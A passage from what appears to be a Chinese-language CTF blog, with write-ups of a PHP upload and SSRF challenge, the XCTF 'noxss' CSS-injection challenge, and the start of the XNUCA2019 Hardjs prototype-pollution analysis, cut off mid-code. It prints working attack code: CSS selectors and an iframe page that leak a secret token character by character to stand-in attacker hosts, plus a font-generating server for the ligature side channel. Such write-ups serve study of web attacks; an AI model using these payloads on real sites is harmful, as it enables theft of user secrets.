       $return[<span class="string">'rootPath'</span>] = $rootpath;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $return[<span class="string">'msg'</span>] = $file-&gt;getError();</span><br><span class="line">        $return[<span class="string">'code'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$redata[$key] = $return;</span><br><span class="line"><span class="keyword">return</span> $redata;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以通过传入allow_file_ext去自定义允许的后缀，定义个phtml传上去即可getshell</p>
<p>不过直接调用upload方法会存在is_login()的验证，所以可以换为upload_root函数就免去了login的验证，最后通过表单设置allow_file_ext</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>从zedd师傅博客里看到的做法</p>
<p>跟进Base.php中的post_data函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post_data</span><span class="params">($url, $param, $type = <span class="string">'json'</span>, $return_array = true, $useCert = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $res = post_data($url, $param, $type, $return_array, $useCert);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 各种常见错误判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($res[<span class="string">'curl_erron'</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error($res[<span class="string">'curl_erron'</span>] . <span class="string">': '</span> . $res[<span class="string">'curl_error'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($return_array) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($res[<span class="string">'errcode'</span>]) &amp;&amp; $res[<span class="string">'errcode'</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(error_msg($res));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($res[<span class="string">'return_code'</span>]) &amp;&amp; $res[<span class="string">'return_code'</span>] == <span class="string">'FAIL'</span> &amp;&amp; <span class="keyword">isset</span>($res[<span class="string">'return_msg'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error($res[<span class="string">'return_msg'</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($res[<span class="string">'result_code'</span>]) &amp;&amp; $res[<span class="string">'result_code'</span>] == <span class="string">'FAIL'</span> &amp;&amp; <span class="keyword">isset</span>($res[<span class="string">'err_code'</span>]) &amp;&amp; <span class="keyword">isset</span>($res[<span class="string">'err_code_des'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error($res[<span class="string">'err_code'</span>] . <span class="string">': '</span> . $res[<span class="string">'err_code_des'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进common.php中post_data函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post_data</span><span class="params">($url, $param = [], $type = <span class="string">'json'</span>, $return_array = true, $useCert = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $has_json = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'json'</span> &amp;&amp; is_array($param)) &#123;</span><br><span class="line">        $has_json = <span class="keyword">true</span>;</span><br><span class="line">        $param = json_encode($param, JSON_UNESCAPED_UNICODE);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span> &amp;&amp; is_array($param)) &#123;</span><br><span class="line">        $param = ToXml($param);</span><br><span class="line">    &#125;</span><br><span class="line">    add_debug_log($url, <span class="string">'post_data'</span>);</span><br><span class="line"><span class="comment">// 初始化curl</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"><span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">    add_debug_log($param, <span class="string">'post_data'</span>);</span><br><span class="line">    <span class="comment">// 设置超时</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 设置超时</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置header</span></span><br><span class="line"><span class="keyword">if</span> ($type == <span class="string">'file'</span>) &#123;</span><br><span class="line">    $header[] = <span class="string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span>) &#123;</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">    $header[] = <span class="string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// dump($param);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line"><span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($useCert[<span class="string">'certPath'</span>]) &amp;&amp; <span class="keyword">isset</span>($useCert[<span class="string">'keyPath'</span>])) &#123;</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSLCERTTYPE, <span class="string">'PEM'</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSLCERT, $useCert[<span class="string">'certPath'</span>]);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSLKEYTYPE, <span class="string">'PEM'</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSLKEY, $useCert[<span class="string">'keyPath'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$res = curl_exec($ch);</span><br><span class="line"><span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">    add_debug_log($res, <span class="string">'post_data'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo $res;die;</span></span><br><span class="line">$flat = curl_errno($ch);</span><br><span class="line"></span><br><span class="line">$msg = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($flat) &#123;</span><br><span class="line">    $msg = curl_error($ch);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// add_request_log($url, $param, $res, $flat, $msg);</span></span><br><span class="line"><span class="keyword">if</span> ($flat) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'curl_erron'</span> =&gt; $flat,</span><br><span class="line">        <span class="string">'curl_error'</span> =&gt; $msg</span><br><span class="line">    ];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($return_array &amp;&amp; !<span class="keyword">empty</span>($res)) &#123;</span><br><span class="line">        $res = $type == <span class="string">'json'</span> ? json_decode($res, <span class="keyword">true</span>) : FromXml($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数里的curl功能并没有什么过滤，设置type为file，即可通过ssrf拿flag.</p>
<h3 id="noxss"><a href="#noxss" class="headerlink" title="noxss"></a>noxss</h3><p>这种攻击手法真的tql</p>
<p>之前也有看过css注入，不过是直接注入属性的值的，比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$token1 = md5($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">$token2 = md5($token1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;&lt;meta charset=utf<span class="number">-8</span>&gt;</span><br><span class="line">&lt;input type=hidden value=<span class="meta">&lt;?</span>=$token1 <span class="meta">?&gt;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> TOKEN = <span class="string">"&lt;?=$token2 ?&gt;"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">	<span class="meta">&lt;?</span>=preg_replace(<span class="string">'#&lt;/style#i'</span>, <span class="string">'#'</span>, $_GET[<span class="string">'css'</span>]) <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以通过css注入出属性的值，也就是value的值</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"0"</span>]</span> &#123;</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"1"</span>]</span> &#123;</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"2"</span>]</span> &#123;</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"e"</span>]</span> &#123;</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"f"</span>]</span> &#123;</span><br><span class="line">	<span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这种方式即可注入出input中value属性的值</p>
<p>那么这道题需要注入出的值是下面的token的值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> TOKEN = <span class="string">"&lt;?=$token2 ?&gt;"</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>核心思路为通过自定义一种字体，这个字体设置一段字体为连字，script使用这个字体，如果 script出现了这段连字，则由于连字的宽度原因产生滚动条，进而带着爆破出的连字访问我们的服务器</p>
<p>ROIS wp 中的核心思路如下</p>
<p><a href="https://imgchr.com/i/MRSPij" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2019/11/19/MRSPij.md.png" alt="MRSPij.md.png"></a></p>
<p>index.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="comment">// Serwer ExprssJS domyślnie dodaje nagłówek ETag,</span></span><br><span class="line"><span class="comment">// ale nam nie jest to potrzebne, więc wyłączamy.</span></span><br><span class="line">app.disable(<span class="string">'etag'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">23460</span>;</span><br><span class="line"><span class="keyword">const</span> js2xmlparser = <span class="built_in">require</span>(<span class="string">'js2xmlparser'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> tmp = <span class="built_in">require</span>(<span class="string">'tmp'</span>);</span><br><span class="line"><span class="keyword">const</span> rimraf = <span class="built_in">require</span>(<span class="string">'rimraf'</span>);</span><br><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Generujemy fonta dla zadanego przedrostka</span></span><br><span class="line"><span class="comment">// i znaków, dla których ma zostać utworzona ligatura.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createFont</span>(<span class="params">prefix, charsToLigature</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> font = &#123;</span><br><span class="line">        <span class="string">"defs"</span>: &#123;</span><br><span class="line">            <span class="string">"font"</span>: &#123;</span><br><span class="line">                <span class="string">"@"</span>: &#123;</span><br><span class="line">                    <span class="string">"id"</span>: <span class="string">"hack"</span>,</span><br><span class="line">                    <span class="string">"horiz-adv-x"</span>: <span class="string">"0"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"font-face"</span>: &#123;</span><br><span class="line">                    <span class="string">"@"</span>: &#123;</span><br><span class="line">                        <span class="string">"font-family"</span>: <span class="string">"hack"</span>,</span><br><span class="line">                        <span class="string">"units-per-em"</span>: <span class="string">"1000"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"glyph"</span>: []</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Domyślnie wszystkie możliwe znaki mają zerową szerokość...</span></span><br><span class="line">    <span class="keyword">let</span> glyphs = font.defs.font.glyph;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> c = <span class="number">0x20</span>; c &lt;= <span class="number">0x7e</span>; c += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> glyph = &#123;</span><br><span class="line">            <span class="string">"@"</span>: &#123;</span><br><span class="line">                <span class="string">"unicode"</span>: <span class="built_in">String</span>.fromCharCode(c),</span><br><span class="line">                <span class="string">"horiz-adv-x"</span>: <span class="string">"0"</span>,</span><br><span class="line">                <span class="string">"d"</span>: <span class="string">"M1 0z"</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        glyphs.push(glyph);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(prefix + (charsToLigature).toString())</span><br><span class="line">    <span class="comment">// ... za wyjątkiem ligatur, które są BARDZO szerokie.</span></span><br><span class="line">    charsToLigature.forEach(<span class="function"><span class="params">c</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> glyph = &#123;</span><br><span class="line">            <span class="string">"@"</span>: &#123;</span><br><span class="line">                <span class="string">"unicode"</span>: prefix + c,</span><br><span class="line">                 <span class="string">"vert-adv-y"</span>: <span class="string">"10000"</span>,</span><br><span class="line">                 <span class="string">"horiz-adv-x"</span>: <span class="string">"10000"</span>,</span><br><span class="line">                 <span class="string">"d"</span>: <span class="string">"M0 10000,v 0 10000z"</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        glyphs.push(glyph);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Konwertujemy JSON-a na SVG.</span></span><br><span class="line">    <span class="keyword">const</span> xml = js2xmlparser.parse(<span class="string">"svg"</span>, font);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A następnie wykorzystujemy fontforge</span></span><br><span class="line">    <span class="comment">// do zamiany SVG na WOFF.</span></span><br><span class="line">    <span class="keyword">const</span> tmpobj = tmp.dirSync();</span><br><span class="line">    fs.writeFileSync(<span class="string">`<span class="subst">$&#123;tmpobj.name&#125;</span>/font.svg`</span>, xml);</span><br><span class="line">    child_process.spawnSync(<span class="string">"/usr/bin/fontforge"</span>, [</span><br><span class="line">        <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/script.fontforge`</span>,</span><br><span class="line">        <span class="string">`<span class="subst">$&#123;tmpobj.name&#125;</span>/font.svg`</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> woff = fs.readFileSync(<span class="string">`<span class="subst">$&#123;tmpobj.name&#125;</span>/font.woff`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Usuwamy katalog tymczasowy.</span></span><br><span class="line">    rimraf.sync(tmpobj.name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// I zwracamy fonta w postaci WOFF.</span></span><br><span class="line">    <span class="keyword">return</span> woff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Endpoint do generowania fontów.</span></span><br><span class="line">app.get(<span class="string">"/font/:prefix/:charsToLigature"</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; prefix, charsToLigature &#125; = req.params;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Dbamy o to by font znalazł się w cache'u.</span></span><br><span class="line">    res.set(&#123;</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'public, max-age=600'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/font-woff'</span>,</span><br><span class="line">        <span class="string">'Access-Control-Allow-Origin'</span>: <span class="string">'*'</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    res.send(createFont(prefix, <span class="built_in">Array</span>.from(charsToLigature)));</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Listening on <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">//const chars = ['t','f']</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;_'</span>.split(<span class="string">''</span>)</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> ff = [], data = <span class="string">''</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> prefix = <span class="string">'xctf&#123;dobra_robota_jestes_mistrzem_CSS&#125;'</span></span></span><br><span class="line"><span class="javascript">chars.forEach(<span class="function"><span class="params">c</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> css = <span class="string">''</span></span></span><br><span class="line"><span class="actionscript">    css = <span class="string">'?theme=../../../../\fa&#123;&#125;)&#123;&#125;'</span></span></span><br><span class="line"><span class="javascript">    css += <span class="string">`body&#123;overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block&#125;html&#123;display:block&#125;*&#123;display:none&#125;body::-webkit-scrollbar&#123;display:block;background: blue url(http://xxxx:23459/?<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(prefix+c)&#125;</span>)&#125;`</span></span></span><br><span class="line"><span class="javascript">    css += <span class="string">`@font-face&#123;font-family:a<span class="subst">$&#123;c.charCodeAt()&#125;</span>;src:url(http://xxxxx:23460/font/<span class="subst">$&#123;prefix&#125;</span>/<span class="subst">$&#123;c&#125;</span>);&#125;`</span></span></span><br><span class="line"><span class="javascript">    css += <span class="string">`script&#123;font-family:a<span class="subst">$&#123;c.charCodeAt()&#125;</span>;display:block&#125;`</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    document.write('<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">scrolling</span>=<span class="string">yes</span> <span class="attr">samesite</span> <span class="attr">src</span>=<span class="string">"http://noxss.cal1.cn:60080/account/userinfo?theme=' + encodeURIComponent(css) + '"</span> <span class="attr">style</span>=<span class="string">"width:1000000px"</span> <span class="attr">onload</span>=<span class="string">"event.target.style.width=\'100px\'"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>')</span></span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/通过css注入窃取html中的数据/" target="_blank" rel="noopener">https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/</a></p>
<p><a href="https://xz.aliyun.com/t/6655#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6655#toc-5</a></p>
<p><a href="https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XNUCA2019-Hardjs</title>
    <url>/2019/09/25/XNUCA2019-Hardjs/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这篇文章主要是对XNUCA-Hardjs的分析</p>
<h3 id="jQuery-extend-CVE-2019-11358"><a href="#jQuery-extend-CVE-2019-11358" class="headerlink" title="jQuery.extend CVE-2019-11358"></a>jQuery.extend CVE-2019-11358</h3><p>再jQuery&lt;3.4.0的版本中存在此原型链污染漏洞，不过这个漏洞影响的只是前端解析，所以需要配合一些其他的姿势出打出一些很棒的漏洞效果，这道题对这个漏洞的利用就很微妙。</p>
<p>在extend点可触发，如下</p>
<p>function getAll(allNode){</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">	url:<span class="string">"/get"</span>,</span><br><span class="line">	type:<span class="string">"get"</span>,</span><br><span class="line">	<span class="keyword">async</span>:<span class="literal">false</span>,</span><br><span class="line">	success: <span class="function"><span class="keyword">function</span>(<span class="params">datas</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ;i&lt;datas.length; i++)&#123;</span><br><span class="line">			$.extend(<span class="literal">true</span>,allNode,datas[i])</span><br><span class="line">		&#125;</span><br><span class="line">		 <span class="built_in">console</span>.log(allNode);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>extend语句说明如下</p>
<p>jQuery.extend() 函数用于将一个或多个对象的内容合并到目标对象。</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nxPKFP.png" alt="nxPKFP.png"></p>
<p>有点类似于merge，jQuery小于3.4的版本都可以通过这个方法来触发原型链污染</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这道题是有两种做法的，第一种是通过ejs进行rce，第二种通过前端+后端的组合拳拿flag(这个组合利用太强了)</p>
<h4 id="通过ejs进行rce"><a href="#通过ejs进行rce" class="headerlink" title="通过ejs进行rce"></a>通过ejs进行rce</h4><p>首先可以npm audit查看一下漏洞，可以清楚看到是存在原型链污染的</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nxiD4P.png" alt="nxiD4P.png"></p>
<p>这道题首先要审计的是server.js，题目中关键漏洞代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">"/get"</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> userid = req.session.userid ; </span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">"select count(*) count from `html` where userid= ?"</span></span><br><span class="line"><span class="comment">// var sql = "select `dom` from  `html` where userid=? ";</span></span><br><span class="line"><span class="keyword">var</span> dataList = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">    res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line">    <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">    <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">        lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        ret.push(doms);</span><br><span class="line">        res.json(ret);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.json([&#123;&#125;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Return recorder is less than 5,so return it without merge."</span>);</span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select `dom` from  `html` where userid=? "</span>;</span><br><span class="line">    <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.length ; i++)&#123;</span><br><span class="line">        ret.push(<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(ret);</span><br><span class="line">    res.json(ret);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这段代码的逻辑如下：<br>首先判断datalist[0]中的记录条数，也就是RowDataPacket的数量，这点打断电进去可以看的更详细一些，接着往下说，这里会根据datalist[0]的数量来选择下一步进行的操作，如果大于5，进入如下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line"><span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"><span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">    lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line"><span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span 